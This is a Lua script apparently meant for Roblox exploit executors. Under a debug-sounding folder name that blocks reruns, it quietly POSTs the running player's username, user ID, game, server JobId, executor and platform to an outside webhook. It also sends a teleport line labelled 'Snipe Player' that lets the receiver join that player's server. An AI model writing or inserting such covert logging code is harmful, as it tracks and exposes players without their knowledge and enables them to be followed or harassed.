local Debug = game:GetService("CoreGui")
local folderName = "MTXClientDebugMode"

local folder = Instance.new("Folder")
folder.Name = folderName

if Debug:FindFirstChild(folderName) then   
else
    folder.Parent = Debug
    local request= http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "💻" or "📱"
    local exe = identifyexecutor() 
    local player = game.Players.LocalPlayer
    local job = tostring(game.JobId)
    local gameId = game.PlaceId
    local plyID = player.UserId
    local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "', player)"
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

    local currentTime = os.date("%H:%M:%S | %Y-%m-%d") 

    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "",
            embeds = {
                {
                    title = Title,
                    description = "",
                    type = "rich",
                    color = Color,
                    thumbnail = {
                        url = ThumbnailUrl
                    },
                    fields = {              
                        {
                            name = "𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧:",
                            value = " 𝐏𝐥𝐚𝐲𝐞𝐫:\n👤 **Username**: [" ..player.Name.. "](https://www.roblox.com/users/" ..player.UserId.. "/profile)\n🎲 **Player ID:** "..plyID.. "\n\n𝐆𝐚𝐦𝐞𝐬:\n🎮 **Game**: ["..gameName.. "](https://www.roblox.com/games/" ..gameId.. ")\n🎲 Game ID: "..gameId.. "\n\n 𝐌𝐢𝐬𝐜:\n🔧 **Executor**: "..exe.. "\n **❓ Platform**: "..deviceType.."\n\n 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐓𝐢𝐦𝐞 🕧\n ".. currentTime,
                            inline = true
                        },
                        {
                            name = FieldTitle,
                            value = FieldText,
                            inline = true
                        },
                        {
                            name = "𝐒𝐧𝐢𝐩𝐞 𝐏𝐥𝐚𝐲𝐞𝐫",
                            value = "```lua\n" .. teleportStatement .. "```",
                            inline = true
                        }
                    },
                    footer = {
                        text = FooterText,
                        icon_url = FooterUrl
                    }
                }
            }
        })
    })    
end
